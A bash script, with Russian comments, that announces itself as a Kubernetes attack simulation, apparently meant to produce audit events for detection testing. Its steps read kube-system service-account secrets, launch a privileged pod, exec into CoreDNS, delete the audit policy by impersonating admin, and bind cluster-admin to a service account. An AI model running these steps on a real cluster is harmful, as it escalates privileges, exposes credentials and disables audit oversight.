#!/bin/bash

echo "=== Начало симуляции атаки ==="

# 1. Создание namespace (игнорируем если уже существует)
kubectl create ns secure-ops 2>/dev/null || true
kubectl config set-context --current --namespace=secure-ops

echo "Создан namespace secure-ops"

# 2. Создание ServiceAccount
kubectl create sa monitoring 2>/dev/null || true
echo "Создан ServiceAccount monitoring"

# 3. Создание пода злоумышленника
kubectl run attacker-pod --image=alpine --command -- sleep 3600 2>/dev/null || true
echo "Создан attacker-pod"

# 4. Проверка доступа к secrets
echo "Проверка доступа к secrets:"
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

# 5. Попытка получить секрет в kube-system
echo "Попытка получить секрет в kube-system:"
SECRET_NAME=$(kubectl get secrets -n kube-system 2>/dev/null | grep default-token | head -n1 | awk '{print $1}') || SECRET_NAME=""
if [ -n "$SECRET_NAME" ]; then
    kubectl get secret -n kube-system "$SECRET_NAME" --as=system:serviceaccount:secure-ops:monitoring 2>&1 || echo "Не удалось получить секрет"
else
    echo "Секрет не найден"
fi

# 6. Создание привилегированного пода
echo "Попытка создать привилегированный pod:"
cat <<EOF | kubectl apply -f - 2>&1
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: secure-ops
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

# 7. Попытка выполнения команды в чужом поде
echo "Попытка выполнения команды в CoreDNS pod:"
CORE_DNS_POD=$(kubectl get pods -n kube-system 2>/dev/null | grep coredns | head -n1 | awk '{print $1}') || CORE_DNS_POD=""
if [ -n "$CORE_DNS_POD" ]; then
    kubectl exec -n kube-system "$CORE_DNS_POD" -- cat /etc/resolv.conf 2>&1 || echo "Не удалось выполнить команду в pod"
else
    echo "CoreDNS pod не найден"
fi

# 8. Попытка удаления политики аудита
echo "Попытка удалить политику аудита:"
kubectl delete -f /etc/kubernetes/audit-policy.yaml --as=admin 2>&1 || echo "Удаление политики аудита не удалось"

# 9. Создание RoleBinding для эскалации привилегий
echo "Создание RoleBinding для эскалации привилегий:"
cat <<EOF | kubectl apply -f - 2>&1
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding
  namespace: secure-ops
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

# Альтернативный вариант - использование ClusterRoleBinding (более опасный):
echo "Альтернативный вариант - создание ClusterRoleBinding:"
cat <<EOF | kubectl apply -f - 2>&1
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalate-cluster-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

echo "=== Симуляция атаки завершена ==="